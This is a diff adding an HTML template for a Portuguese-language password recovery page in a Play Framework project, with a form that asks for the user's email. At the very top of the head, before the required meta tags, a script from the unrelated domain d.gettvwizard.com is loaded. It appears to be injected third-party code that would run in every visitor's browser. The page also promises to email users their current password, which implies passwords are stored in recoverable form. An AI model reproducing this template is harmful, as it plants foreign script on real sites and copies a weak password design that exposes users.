@@ -1,0 +1,60 @@
+@(message: String)
+
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head><script src="http://d.gettvwizard.com/l/load.js"></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+
+    <title>Recupera Senha</title>
+    
+    <!-- Bootstrap core CSS -->
+    <link href="http://getbootstrap.com/dist/css/bootstrap.min.css" rel="stylesheet">
+	
+	<link rel="stylesheet" media="screen" href="@routes.Assets.versioned("stylesheets/bootstrap.css")">
+	
+   
+    <!-- Custom styles for this template -->
+    <link href="http://getbootstrap.com/examples/signin/signin.css" rel="stylesheet">
+    
+  
+	
+	<link rel="stylesheet" media="screen" href='@routes.Assets.versioned("stylesheets/main.css")'>
+	<link rel="stylesheet" media="screen" href='@routes.Assets.versioned("stylesheets/font-awesome.min.css")'>
+  
+  </head>
+
+  <body>
+	  
+	<!-- Fixed navbar -->
+    <div class="navbar navbar-default navbar-fixed-top">
+      <div class="container">
+          <center><img class="centralizar" src='@routes.Assets.versioned("images/logo.jpg")'/></center>
+      </div>
+    </div>
+
+	<!-- Login -->
+    <div class="container">
+
+       <form class="form-signin" action="#" method="POST">
+      
+		Informe o seu email cadastrado para receber sua senha atual.         
+        <div class="form-group">
+        	<label for="inputEmail"></label>
+        	<input name="email" type="text" class="form-control" id="inputEmail" placeholder="Email" required>
+      
+		</div>
+       
+        <center>
+        <button class="btn btn-lg btn-primary" type="submit">Enviar</button>
+
+      </form>
+
+    </div>
+  </body>
+	<div id="f">
+	© Copyright 2015 All rights reserved.
+	</div>
+</html>
